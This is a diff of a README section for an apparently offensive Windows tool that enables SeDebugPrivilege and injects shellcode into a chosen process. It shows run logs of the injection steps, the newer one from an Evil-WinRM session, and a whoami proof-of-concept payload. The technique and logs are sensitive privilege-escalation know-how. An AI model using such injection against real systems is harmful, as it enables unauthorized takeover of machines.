@@ -54,36 +54,27 @@ Here's a short description for your tool:
 
 ## [Privilege Escalation via SeDebugPrivilege (C)](https://github.com/0xUnd3adBeef/DIY-Tools/blob/main/InjectThreadSeDebug.c)
 
-C tool that enables SeDebugPrivilege, enumerates running processes, and injects shellcode into processes running as SYSTEM (S-1-5-18). The included shellcode executes `cmd.exe /c whoami /all > C:\temp\whoanew.txt` as a proof of concept.
+C tool that enables SeDebugPrivilege and injects shellcode into user defined process. The included shellcode executes `cmd.exe /c whoami /all > C:\temp\whoanew.txt` as a proof of concept.
+
+> [!WARNING]  
+> Using this PoC on a process may crash it, avoid processes that misght cause BSOD and processes that a system routine depends on.
 
 ```powershell
-PS C:\tools> .\SeDebugInject.exe
-Begin
-[+] Successfully enabled SeDebugPrivilege on current token
-[+] Successfully made a snapshot
-[+] Successfully went to first
-
-[!] Failed opening process [System Process]
-  -> Error code : 5
-
-[!] Failed opening process smss.exe
-  -> Error code : 5
-
-[+] Successfully opened process winlogon.exe 
-[+] Successfully Opened ProcessTOken
-[+] Successfully got token information
-[+] Successfully got token info2 
-  -> The SID doesn't match defined SID
-
-[+] Successfully opened process services.exe 
-[+] Successfully Opened ProcessTOken
-[+] Successfully got token information
-[+] Successfully got token info2 
+*Evil-WinRM* PS C:\Users\svc_test\Documents> .\SeDebugInject.exe 2568
+SeDebugPrivilege shellcode injection PoC - Brought to you by \u0030xUnd3adBeef                                                                                                                      
+Begin - Targeting PID: 2568                                                                                                                                                                         
+[+] Successfully enabled SeDebugPrivilege on current token                                                                                                                                          
+[+] Successfully opened process with PID: 2568
+[-] Failed to OpenProcessToken with TOKEN_QUERY
+Error code : 5
+Continuing anyway .. . ..
 [+] Success while allocating remote memory
 [+] Success while writing remote memory
 [+] Success while creating remote thread
 [~] Attempting to start remote thread . . .
-[ +++ ] Remote thread started
+[ +++ ] Remote thread started successfully in PID 2568
+[+] Injection completed
+
 ```
 
 Check the output file to verify execution:
